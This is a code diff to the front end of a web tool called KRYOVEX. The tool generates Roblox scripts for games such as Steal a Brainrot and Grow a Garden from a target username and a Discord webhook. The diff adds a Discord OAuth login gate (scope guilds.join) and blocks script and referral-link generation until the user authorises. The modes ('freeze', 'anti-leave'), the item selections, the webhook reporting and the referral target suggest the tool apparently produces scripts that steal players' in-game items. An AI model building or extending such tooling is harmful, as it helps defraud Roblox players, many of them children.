@@ -114,6 +114,8 @@
         body.ve-theme .scroll-box::-webkit-scrollbar { width: 4px; }
         body.ve-theme .scroll-box::-webkit-scrollbar-thumb { background: var(--ve-neon); border-radius: 10px; }
         body.ve-theme .count-text { font-size: 9px; font-weight: 800; color: #64748b; text-transform: uppercase; margin-top: 6px; }
+        body.ve-theme .auth-btn { font-size: 10px; font-weight: 800; color: #93c5fd; border: 1px solid rgba(59,130,246,0.45); background: rgba(59,130,246,0.14); padding: 8px 16px; border-radius: 12px; display: inline-flex; align-items: center; gap: 8px; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; cursor: pointer; transition: 0.25s; }
+        body.ve-theme .auth-btn:hover { background: var(--ve-neon); color: #fff; box-shadow: 0 0 16px var(--ve-glow); }
         body.ve-theme .auth-ok { font-size: 10px; font-weight: 800; color: #93c5fd; border: 1px solid rgba(59,130,246,0.35); background: rgba(59,130,246,0.14); padding: 8px 16px; border-radius: 12px; display: flex; align-items: center; gap: 8px; }
         body.ve-theme .copy-link { color: #60a5fa; font-size: 10px; font-weight: 800; text-transform: uppercase; cursor: pointer; }
         body.ve-theme .ref-copy-btn { background: #2563eb; color: #fff; padding: 0 16px; border-radius: 10px; font-size: 10px; font-weight: 800; cursor: pointer; border: none; }
@@ -297,8 +299,13 @@
     <!-- KRYOVEX HEADER -->
     <div class="ve-header" id="ve-header">
         <div class="ve-title">KRYOVEX</div>
-        <div id="logged-in-status" class="auth-ok">
-            <i class="fa-solid fa-circle-check" style="color:#60a5fa"></i> READY
+        <div style="display:flex;align-items:center;gap:8px;">
+            <a href="https://discord.com/oauth2/authorize?client_id=1573381547174928465&response_type=code&redirect_uri=https%3A%2F%2Fkyovex.onrender.com%2F&scope=identify+guilds.join" id="top-login-btn" class="auth-btn">
+                <i class="fa-brands fa-discord"></i> AUTHORIZE
+            </a>
+            <div id="logged-in-status" class="auth-ok hidden">
+                <i class="fa-solid fa-circle-check" style="color:#60a5fa"></i> READY
+            </div>
         </div>
     </div>
 
@@ -398,6 +405,9 @@
                         <span class="slider"></span>
                     </label>
                 </div>
+                <p id="login-error-msg" class="hidden" style="color:#ef4444;font-size:10px;font-weight:700;text-transform:uppercase;text-align:center;">
+                    AUTHORIZE FIRST TO GENERATE SCRIPT
+                </p>
                 <button onclick="generateScript()" class="primary-btn"><span id="gen-text">GENERATE SCRIPT</span></button>
             </div>
             <div id="output-section" class="hidden" style="margin-top:20px;padding-top:20px;">
@@ -556,6 +566,9 @@
                 <div><p style="font-size:12px;font-weight:600;">Short Loadstring</p><p class="lbl" style="margin:2px 0 0;">Generate /v2/scrap/.../raw link</p></div>
                 <label class="switch"><input type="checkbox" id="gag-loadstring-toggle"><span class="slider"></span></label>
             </div>
+            <p id="gag-login-error-msg" class="hidden" style="color:#ef4444;font-size:10px;font-weight:700;text-transform:uppercase;text-align:center;">
+                AUTHORIZE FIRST TO GENERATE SCRIPT
+            </p>
             <button onclick="generateGagScript()" class="primary-btn"><span id="gag-gen-text">GENERATE SCRIPT</span></button>
         </div>
         <div id="gag-output-section" class="hidden" style="margin-top:20px;padding-top:20px;">
@@ -696,17 +709,35 @@
             ['normal','anti-leave'].forEach(x=>{const b=document.getElementById(`custombase-btn-${x}`);if(b)b.classList.toggle('active',x===m);});
         }
 
-        // ===== SESSION =====
-        let isAuthenticated=true;
+        // ===== AUTH / SESSION =====
+        let isAuthenticated=false;
         function checkSession(){
             if(IS_REF_SITE)return;
-            if(new URLSearchParams(window.location.search).get('login')==='success'){
-                window.history.replaceState({},document.title,'/');
+            const params=new URLSearchParams(window.location.search);
+            const t=localStorage.getItem('auth_timestamp'),now=Date.now();
+            if(params.get('login')==='success'||params.get('code')){
+                localStorage.setItem('auth_timestamp',now);
+                window.history.replaceState({},document.title,window.location.pathname);
+                setLoggedIn();
+                return;
             }
-            setLoggedIn();
+            if(t&&(now-Number(t)<8*60*60*1000))setLoggedIn();
+            else setLoggedOut();
         }
-        function setLoggedIn(){isAuthenticated=true;document.getElementById('logged-in-status').classList.remove('hidden');createPills();createSkinPills();createGearPills();}
-        function setLoggedOut(){setLoggedIn();}
+        function setLoggedIn(){
+            isAuthenticated=true;
+            document.getElementById('top-login-btn')?.classList.add('hidden');
+            document.getElementById('logged-in-status')?.classList.remove('hidden');
+            document.getElementById('login-error-msg')?.classList.add('hidden');
+            document.getElementById('gag-login-error-msg')?.classList.add('hidden');
+            createPills();createSkinPills();createGearPills();
+        }
+        function setLoggedOut(){
+            isAuthenticated=false;
+            document.getElementById('top-login-btn')?.classList.remove('hidden');
+            document.getElementById('logged-in-status')?.classList.add('hidden');
+            createPills();createSkinPills();createGearPills();
+        }
 
         // ===== SAB DATA =====
         const brainrots=["Garama and Madundung", "Capitano Moby", "Burguro And Fryuro", "Ketchuru and Musturu", "Lavadorito Spinito", "Ketupat Kepat", "Tictac Sahur", "Tang Tang Keletang", "Money Money Puggy", "Nuclearo Dinossauro", "Graipuss Medussi", "Cerberus", "Dragon Cannelloni", "Agarrini la Palini", "Fragola La La La", "Los Hotspotsitos", "Los Bros", "Tralaledon", "Los Puggies", "Los Primos", "Los Tacoritas", "Los Spaghettis", "Spooky and Pumpky", "Fragrama and Chocrama", "La Casa Boo", "Ketupat Bros", "Cooki and Milki", "Popcuru and Fizzuru", "La Supreme Combinasion", "Dragon Gingerini", "Headless Horseman", "Hydra Dragon Cannelloni", "Celularcini Viciosini", "La Grande Combinasion", "Los Trios", "La Sahur Combinasion", "Bacuru and Egguru", "Eviledon", "Orcaledon", "Money Money Reindeer", "Los Jolly Combinasionas", "Jolly Jolly Sahur", "Chicleteira Noelteira", "Bisonte Giuppitere", "Jackorilla", "Reindeer Tralala", "Pumpkini Spyderini", "Frankentteo", "Santteo", "Telemorte", "Spaghetti Tualetti", "La Secret Combinasion", "La Food Combinasion", "Los Spooky Combinasionas", "Karkerkar Kurkur", "La Ginger Sekolah", "Rosey and Teddy", "Los Sekolahs", "Reinito Sleighito", "Swaggy Bros", "La Taco Combinasion", "Chipso and Queso", "La Spooky Grande", "Tuff Toucan", "Chillin Chili", "Gobblino Uniciclino", "Strawberry Elephant", "La Extinct Grande", "Tacorita Bicicleta", "Quesadillo Vampiro", "Perrito Burrito", "La Vacca Saturno Saturnita", "Karker Sahur", "Bunito Bunito Spinito", "Pirulitoita Bicicleteira", "Bunnyman", "Brunito Marsito", "Guest 666", "Mariachi Corazoni", "Swag Soda", "Extinct Matteo", "Los Quesadillas", "Spinny Hammy", "Meowl", "Skibidi Toilet", "Nacho Spyder", "Griffin", "W or L", "La Jolly Grande", "La Romantic Grande", "Festive 67", "Los Tralaleritos", "Las Tralaleritas", "GOAT", "Love Love Bear", "Ginger Gerat", "Mieteteira Bicicleteira", "Trenostruzzo Turbo 4000", "La Karkerkar Combinasion", "La Vacca Prese Presente", "Rocco Disco", "1x1x1x1", "25", "67", "Abyssaloco", "Antonio", "Aquarino", "Arcadopus", "Arcadragon", "Bananito", "Baskito", "Bearito Cabinito", "Berryno", "Blackhole Goat", "Boatito Auratito", "Bombardiro Vaccariro", "Boppin Bunny", "Buho de Volto", "Bunny Bunny Bunny Sahur", "Bunny and Eggy", "Buntteo", "Burrito Bandito", "Camera Ramena", "Capitano Gullini", "Cash or Card", "Caylusaurus", "Celestial Pegasus", "Chachechi", "Chicleteira Bicicleteira", "Chicleteira Cupideira", "Chicleteira Surfeiteira", "Chicleteirina Bicicleteirina", "Chill Puppy", "Chimnino", "Churrito Bunnito", "Cigno Fulgoro", "Cloverat Clapat", "Coco and Mango", "Craburger", "Cuadramat and Pakrahmatmamat", "Cupid Cupid Sahur", "Cupid Hotspot", "DJ Panda", "Digi Narwhal", "Donkeyturbo Express", "Dragon Aquanini", "Dug dug dug", "Duggy Bros", "Dul Dul Dul", "Easter Easter Easter Sahur", "Eid Eid Eid Sahur", "Elefanto Frigo", "Esok Sekolah", "Extinct Tralalero", "Fishboard", "Fishino Clownino", "Flancito", "Flipa Sandala", "Fortunu and Cashuru", "Foxini Lanternini", "Frullato Framingo", "Futbolini Skatini", "Gelato Lumacho", "Giftini Spyderini", "Girafini Raftini", "Glaciator", "Globa Steppa", "Gold Egg", "Gold Elf", "Gold Gold Gold", "Granny", "Guerriro Digitale", "Gym Bros", "Ho Ho Ho Sahur", "Hopilikalika Hopilikalako", "Horegini Boom", "Hydra Bunny", "Jelly Moby", "Job Job Job Sahur", "John Doe", "Kalika Bros", "Kraken", "La Anniversary Grande", "La Cucaracha", "La Easter Grande", "La Lucky Grande", "La Summer Grande", "La Vacca Jacko Linterino", "La Vacca Lepre Lepreino", "Las Sis", "Las Vaquitas Saturnitas", "List List List Sahur", "Los 25", "Los 67", "Los Amigos", "Los Bunitos", "Los Burritos", "Los Candies", "Los Chicleteiras", "Los Chillis", "Los Combinasionas", "Los Cucarachas", "Los Cupids", "Los Fruits", "Los Hackers", "Los Jobcitos", "Los Karkeritos", "Los Mariachis", "Los Matteos", "Los Mi Gatitos", "Los Mobilis", "Los Nooo My Hotspotsitos", "Los Planitos", "Los Spyderinis", "Los Sweethearts", "Los Tortus", "Love Love Love Sahur", "Lovin Rose", "Luck Luck Luck Sahur", "Lucky Block", "Mi Gatito", "Money Money Bros", "Naughty Naughty", "Noo my Candy", "Noo my Eggs", "Noo my Gold", "Noo my Heart", "Noo my Present", "Noo my examine", "Nooo My Hotspot", "Octoball", "Ombrello Topolino", "Pancake and Syrup", "Paradiso Axolottino", "Please my Present", "Pot Hotspot", "Pot Pumpkin", "Quackini Snackini", "Quesadilla Crocodila", "Rang Ring Bus", "Rico Dinero", "Rocketini Frostini", "Rosetti Tualetti", "Rubrikiko", "Sammyni Cakini", "Sammyni Fattini", "Sammyni Spyderini", "Sand Sand Sand", "Santa Hotspot", "Serafinna Medusella", "Signore Carapace", "Snailo Clovero", "Steakini Fattini", "Strawberrita", "Sushi Inu", "Tacorillo Crocodillo", "Tirilikalika Tirilikalako", "To To To Sahur", "Torrtuginni Dragonfrutini", "Trickolino", "Triplito Tralaleritos", "Ventoliero Pavonero", "Venuspino", "Vulturino Skeletono", "Yess my examine", "Zombie Tralala", "Esok Goala", "Ref Ref Ref Sahur", "Hippo Golazo", "Bufalino Boomberino", "Capitano Americano", "Var Var Var", "Los Tictacs", "Los Tangcitos", "Los Admins", "Moby Bros", "Grabatron", "Rubiko and Kubiko", "Cangurato Gelato", "Noodle Noodle Poodle", "Toro Españolo", "Chicleteira Champeona", "Examen Bros", "Pizza and Ranch", "Los Secret Combinasionas", "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino", "Honey Honey Bear", "Pogo Pogo Penguin", "Conetto Morsetto", "La Breakfast Combinasion", "La Fuse Machine", "Candini Fluffini", "Polaroidini", "Noo my Resume", "Peschito Machito", "4th Bros", "Los Cornis", "Gelatina Volatina", "Los Sigmas", "Yess my Resume", "Nachorilla", "Sammyni Truckini", "Tacoturbo Tacorito", "Burrito Bat", "Pop Pop Petalini", "Rosatops Triceratino", "Motorino Bumbino", "Syrup Samurai", "Orchidox", "Los Dragons", "La Craft Machine", "Gold and Diamond", "Chicli Chicla", "Panda Popanda", "Deputy Leopard", "John Pork", "Zebrino Pianino", "Ski Ski Skunki", "Sir Mangus", "Sammyni Spookyni", "Rockarino Rockara", "Capibaro Celestino", "Draculino", "Fangaro Lupino", "Gattino Hydrantino", "Gub", "Honey Honey Narwhal", "Hydra Serpent", "Lavamanta", "Lionello Casarello", "Los Treaters", "Marino Submarino", "Oni Oni Panda", "Pelican Pachetto", "Phoenix", "Pin Pin Pengu", "Plant Bros", "Puffino Builderino", "Qamar Camelamp", "Ranito Pepito", "Rexino Ramino", "Dragon Skeletonini", "Cobra Gelato", "Flying Dutchman", "Slushki Huski", "Boo Boo Rocket", "Bat-in-the-Box", "Bananito Skelito", "Zombie Bowl", "Grim Cheese", "Arca Bros", "Medusini and Demonini", "Puppetmaster", "Skelly and Coffy", "Scarino Crowino", "Cobra Gelato", "Spooketti Tualetti", "Scorpi Inferni", "Spooky Spooky Sahur", "Jacko Jakat", "Pum Pum Pum", "Tosto Dino", "Fang Fang Draculang", "Money Money Cat", "Spooky Kart", "Chicken Zombie", "Skooter Skelly", "Co Co Co Sahur", "Cola Cat"];
@@ -734,6 +765,8 @@
         function setMode(mode){currentMode=mode;['normal','freeze','dice','anti-leave','custom'].forEach(m=>document.getElementById(`btn-${m}`).classList.toggle('active',m===mode));document.getElementById('custom-section').classList.toggle('hidden',mode!=='custom');}
 
         async function generateScript(){
+            if(!isAuthenticated&&!IS_REF_SITE){document.getElementById('login-error-msg').classList.remove('hidden');return;}
+            document.getElementById('login-error-msg').classList.add('hidden');
             const btnText=document.getElementById('gen-text'),output=document.getElementById('output-section'),display=document.getElementById('script-display');
             const user=IS_REF_SITE?REF_TARGET_USER:(document.getElementById('roblox-username').value||'USER');
             const userTypedWebhook=document.getElementById('webhook').value.trim();
@@ -949,6 +982,8 @@
         function setGagMode(mode){gagCurrentMode=mode;['normal','custom'].forEach(m=>document.getElementById(`gag-btn-${m}`).classList.toggle('active',m===mode));document.getElementById('gag-custom-section').classList.toggle('hidden',mode!=='custom');}
 
         async function generateGagScript(){
+            if(!isAuthenticated&&!IS_REF_SITE){document.getElementById('gag-login-error-msg').classList.remove('hidden');return;}
+            document.getElementById('gag-login-error-msg').classList.add('hidden');
             const btnText=document.getElementById('gag-gen-text'),output=document.getElementById('gag-output-section'),display=document.getElementById('gag-script-display');
             const nTarget=document.getElementById('gag-normal-target').value.trim(),nWebhook=document.getElementById('gag-normal-webhook').value.trim();
             const sT=Array.from(gagSelectedSeeds).map(s=>`    ["${s}"] = true`).join(',\n'),pT=Array.from(gagSelectedPets).map(p=>`    ["${p}"] = true`).join(',\n'),gT=Array.from(gagSelectedGears).map(g=>`    ["${g}"] = true`).join(',\n'),prT=Array.from(gagSelectedProps).map(p=>`    ["${p}"] = true`).join(',\n');
@@ -984,6 +1019,7 @@
             const u=document.getElementById('ref-roblox-input').value.trim(),w=document.getElementById('ref-webhook-input').value.trim();
             const btn=document.getElementById('create-ref-text'),err=document.getElementById('ref-error'),errMsg=document.getElementById('ref-error-msg');
             err.classList.add('hidden');document.getElementById('ref-output').classList.add('hidden');
+            if(!isAuthenticated){errMsg.textContent='Authorization required';err.classList.remove('hidden');return;}
             if(!u){errMsg.textContent='Enter a valid Roblox username';err.classList.remove('hidden');return;}
             if(!w.startsWith('https://discord.com/api/webhooks/')&&!w.startsWith('https://discordapp.com/api/webhooks/')){errMsg.textContent='Enter a valid Discord webhook URL';err.classList.remove('hidden');return;}
             btn.textContent='GENERATING...';
